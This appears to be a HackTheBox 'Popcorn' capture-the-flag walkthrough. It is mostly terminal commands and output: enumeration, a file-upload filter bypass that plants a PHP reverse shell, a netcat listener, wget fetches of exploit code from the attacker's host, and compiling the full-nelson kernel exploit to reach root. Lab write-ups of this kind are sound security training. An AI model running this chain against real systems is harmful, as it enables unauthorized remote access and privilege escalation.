@@ -1,0 +1,391 @@
+RECON
+root@kali:~/htb/popcorn# nmap -sC -sV -Pn 10.10.10.6
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
+|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
+80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
+|_http-server-header: Apache/2.2.12 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+ENUM WEB
+
+root@kali:~/htb/popcorn# gobuster -u http://10.10.10.6 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux -x .txt,.php
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.6/
+[+] Threads      : 80
+[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes : 200,204,301,302,307
+[+] User Agent   : Linux
+[+] Extensions   : .txt,.php
+=====================================================
+/index (Status: 200)
+/index.html (Status: 200)
+/test (Status: 200)
+/test.php (Status: 200)
+/torrent (Status: 301)
+=====================================================
+
+
+VISIT http://10.10.10.6/torrent
+
+
+SIGN UP TO TORRENT
+
+
+DOWNLOAD A TORRENT FILE TO UPLOAD
+https://images.kali.org/kali-linux-2020.3-installer-netinst-i386.iso.torrent
+
+USE PHP REVERSE SHELL PENTEST MONKEY AND ADD PNG TO EXTENSION
+root@kali:~/htb/popcorn# cp php-reverse-shell.php prshell.png.php
+
+
+INTERCEPT UPLOAD REQUESTWITH BURPSUITE TO CHANGE APP TYPE FROM PHP TO PNG
+
+Content-Type: application/x-php which we can easily change to Content-Type: image/png
+
+BROWSER REQUEST
+POST /torrent/upload_file.php?mode=upload&id=7248d6077279e22c1d87e3431de2fe1d77a3e711 HTTP/1.1
+Host: 10.10.10.6
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.6/torrent/edit.php?mode=edit&id=7248d6077279e22c1d87e3431de2fe1d77a3e711
+Cookie: /torrent/=; /torrent/login.php=; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; saveit_0=4; saveit_1=5; /torrent/index.phpfirsttimeload=0; /torrent/update_stats2.php=; PHPSESSID=9ca905782321fb1eb4c0ba00b89f0bfb
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------76350641314567035021219543269
+Content-Length: 5842
+
+-----------------------------76350641314567035021219543269
+Content-Disposition: form-data; name="file"; filename="prshell.png.php"
+Content-Type: image/png
+
+SERVER RESPONSE
+HTTP/1.1 200 OK
+Date: Mon, 02 Nov 2020 02:09:56 GMT
+Server: Apache/2.2.12 (Ubuntu)
+X-Powered-By: PHP/5.2.10-2ubuntu6.10
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: private
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 141
+Connection: close
+Content-Type: text/html
+
+Upload: prshell.png.php<br />Type: image/png<br />Size: 5.361328125 Kb<br />Upload Completed. <br />Please refresh to see the new screenshot.
+
+
+
+TRIGGER THE SHELL
+http://10.10.10.6/torrent/upload/
+
+Index of /torrent/upload
+[ICO]	Name	Last modified	Size	Description
+[DIR]	Parent Directory	 	-
+[IMG]	723bc28f9b6f924cca68ccdff96b6190566ca6b4.png	17-Mar-2017 23:06 	58K
+[IMG]	7248d6077279e22c1d87e3431de2fe1d77a3e711.jpg	02-Nov-2020 04:05 	5.4K
+[ ]	7248d6077279e22c1d87e3431de2fe1d77a3e711.php	02-Nov-2020 04:09 	5.4K
+[IMG]	7248d6077279e22c1d87e3431de2fe1d77a3e711.png	02-Nov-2020 03:56 	5.4K
+[IMG]	noss.png	02-Jun-2007 23:15 	32K
+Apache/2.2.12 (Ubuntu) Server at 10.10.10.6 Port 80
+
+GET LOW PRIV SHELL
+root@kali:~/htb/popcorn# nc -lvp 53
+listening on [any] 53 ...
+
+10.10.10.6: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.6] 34826
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+ 04:12:41 up  4:47,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+
+USE LINUX EXPLOIT SUGGESTOR SCRIPT
+root@kali:~/htb/popcorn# cp /root/Documents/LinuxPrivScripts/linux-exploit-suggester.sh .
+root@kali:~/htb/popcorn# cp linux-exploit-suggester.sh les.sh
+root@kali:~/htb/popcorn# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.6 - - [01/Nov/2020 21:21:51] "GET /les.sh HTTP/1.0" 200 -
+10.10.10.6 - - [01/Nov/2020 21:27:28] "GET /15704.c HTTP/1.0" 200 -
+
+
+GET LINUX EXPLOIT SUGGESTOR SCRIPT
+$ wget http://10.10.14.8/les.sh
+--2020-11-02 04:26:44--  http://10.10.14.8/les.sh
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 82207 (80K) [text/x-sh]
+Saving to: `les.sh'
+
+     0K .......... .......... .......... .......... .......... 62%  928K 0s
+    50K .......... .......... ..........                      100% 2.07M=0.07s
+
+2020-11-02 04:26:44 (1.15 MB/s) - `les.sh' saved [82207/82207]
+
+$ ls -l
+total 208
+-rw-rw-rw- 1 www-data www-data  82207 Nov  2 04:21 les.sh
+-rw-r--r-- 1 root     root       1600 Nov  1 23:25 vgauthsvclog.txt.0
+drwx------ 2 root     root       4096 Nov  1 23:27 vmware-root
+$ chmod 744 les.sh
+
+RUN LES SCRIPT
+
+$ ./les.sh
+
+Available information:
+
+Kernel version: 2.6.31
+Architecture: i686
+Distribution: ubuntu
+Distribution version: 9.10
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+72 kernel space exploits
+42 user space exploits
+
+Possible Exploits:
+
+cat: write error: Broken pipe
+[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson
+
+   Details: http://vulnfactory.org/exploits/full-nelson.c
+   Exposure: highly probable
+   Tags: [ ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)} ],ubuntu=10.04{kernel:2.6.32-(21|24)-server}
+   Download URL: http://vulnfactory.org/exploits/full-nelson.c
+
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: probable
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: probable
+   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847.cpp
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2010-3904] rds
+
+   Details: http://www.securityfocus.com/archive/1/514379
+   Exposure: probable
+   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},[ ubuntu=10.10|9.10 ],fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
+   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+
+[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson
+
+   Details: https://www.exploit-db.com/exploits/17787/
+   Exposure: probable
+   Tags: [ ubuntu=(10.04|9.10) ]{kernel:2.6.(31|32)-(14|21)-server}
+   Download URL: https://www.exploit-db.com/download/17787
+
+[+] [CVE-2010-1146] reiserfs
+
+   Details: https://www.exploit-db.com/exploits/12130/
+   Exposure: probable
+   Tags: [ ubuntu=9.10 ]
+   Download URL: https://www.exploit-db.com/download/12130
+
+[+] [CVE-2010-0832] PAM MOTD
+
+   Details: https://www.exploit-db.com/exploits/14339/
+   Exposure: probable
+   Tags: [ ubuntu=9.10|10.04 ]
+   Download URL: https://www.exploit-db.com/download/14339
+   Comments: SSH access to non privileged user is needed
+
+[+] [CVE-2017-6074] dccp
+
+   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
+   Exposure: less probable
+   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
+   Download URL: https://www.exploit-db.com/download/41458
+   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
+
+[+] [CVE-2017-1000370,CVE-2017-1000371] linux_offset2lib
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Exposure: less probable
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c
+   Comments: Uses "Stack Clash" technique
+
+[+] [CVE-2017-1000366,CVE-2017-1000371] linux_ldso_dynamic
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Exposure: less probable
+   Tags: debian=9|10,ubuntu=14.04.5|16.04.2|17.04,fedora=23|24|25
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c
+   Comments: Uses "Stack Clash" technique, works against most SUID-root PIEs
+
+[+] [CVE-2017-1000366,CVE-2017-1000370] linux_ldso_hwcap
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Exposure: less probable
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c
+   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
+
+[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+   Exposure: less probable
+   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
+   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+
+[+] [CVE-2016-6663,CVE-2016-6664|CVE-2016-6662] mysql-exploit-chain
+
+   Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
+   Exposure: less probable
+   Tags: ubuntu=16.04.1
+   Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
+   Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected
+
+[+] [CVE-2014-5119] __gconv_translit_find
+
+   Details: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
+   Exposure: less probable
+   Tags: debian=6
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/34421.tar.gz
+
+[+] [CVE-2014-0196] rawmodePTY
+
+   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/33516
+
+[+] [CVE-2013-0268] msr
+
+   Details: https://www.exploit-db.com/exploits/27297/
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/27297
+
+[+] [CVE-2010-4347] american-sign-language
+
+   Details: https://www.exploit-db.com/exploits/15774/
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/15774
+
+[+] [CVE-2010-3437] pktcdvd
+
+   Details: https://www.exploit-db.com/exploits/15150/
+   Exposure: less probable
+   Tags: ubuntu=10.04
+   Download URL: https://www.exploit-db.com/download/15150
+
+[+] [CVE-2010-3301] ptrace_kmod2
+
+   Details: https://www.exploit-db.com/exploits/15023/
+   Exposure: less probable
+   Tags: debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}
+   Download URL: https://www.exploit-db.com/download/15023
+
+[+] [CVE-2010-3081] video4linux
+
+   Details: https://www.exploit-db.com/exploits/15024/
+   Exposure: less probable
+   Tags: RHEL=5
+   Download URL: https://www.exploit-db.com/download/15024
+
+[+] [CVE-2010-2959] can_bcm
+
+   Details: https://www.exploit-db.com/exploits/14814/
+   Exposure: less probable
+   Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
+   Download URL: https://www.exploit-db.com/download/14814
+
+[+] [CVE-2009-3547] pipe.c 3
+
+   Details: https://www.exploit-db.com/exploits/10018/
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/10018
+
+[+] [CVE-2009-3547] pipe.c 2
+
+   Details: https://www.exploit-db.com/exploits/33322/
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/33322
+
+[+] [CVE-2009-3547] pipe.c 1
+
+   Details: https://www.exploit-db.com/exploits/33321/
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/33321
+
+COMPILE FULL NELSON EXPLOIT ON POPCORN
+$ wget http://10.10.14.8/15704.c
+--2020-11-02 04:32:23--  http://10.10.14.8/15704.c
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9487 (9.3K) [text/plain]
+Saving to: `15704.c'
+
+     0K .........                                             100%  380K=0.02s
+
+2020-11-02 04:32:23 (380 KB/s) - `15704.c' saved [9487/9487]
+
+$ ls -l
+total 220
+-rw-rw-rw- 1 www-data www-data   9487 Nov  2 04:24 15704.c
+-rw-rw-rw- 1 www-data www-data 103114 Nov  2 04:20 enum.log
+-rwxr--r-- 1 www-data www-data  82207 Nov  2 04:21 les.sh
+-rwxr--r-- 1 www-data www-data  10441 Nov  2 04:13 lle.sh
+-rw-r--r-- 1 root     root       1600 Nov  1 23:25 vgauthsvclog.txt.0
+drwx------ 2 root     root       4096 Nov  1 23:27 vmware-root
+$ gcc 15704.c -o 15704_fullnelson
+$ ls -l
+total 236
+-rw-rw-rw- 1 www-data www-data   9487 Nov  2 04:24 15704.c
+-rwxrwxrwx 1 www-data www-data  13557 Nov  2 04:32 15704_fullnelson
+-rw-rw-rw- 1 www-data www-data 103114 Nov  2 04:20 enum.log
+-rwxr--r-- 1 www-data www-data  82207 Nov  2 04:21 les.sh
+-rwxr--r-- 1 www-data www-data  10441 Nov  2 04:13 lle.sh
+-rw-r--r-- 1 root     root       1600 Nov  1 23:25 vgauthsvclog.txt.0
+drwx------ 2 root     root       4096 Nov  1 23:27 vmware-root
+
+ELEVATE TO ROOT SHELL WITH FULLNELSON
+$ ./15704_fullnelson
+
+id
+uid=0(root) gid=0(root)
+ls -l /home/george/Desktop
+
+GET USER FLAG
+ls -l /home/george
+total 836
+-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
+-rw-r--r-- 1 george george     33 Nov  1 23:27 user.txt
+cat user.txt
+
+cat /home/george/user.txt
+######################d
+
+GET ROOT FLAG
+ls -l /root
+total 4
+-rw------- 1 root root 33 Nov  1 23:27 root.txt
+cat /root/root.txt
+#####################
+
+
+
+
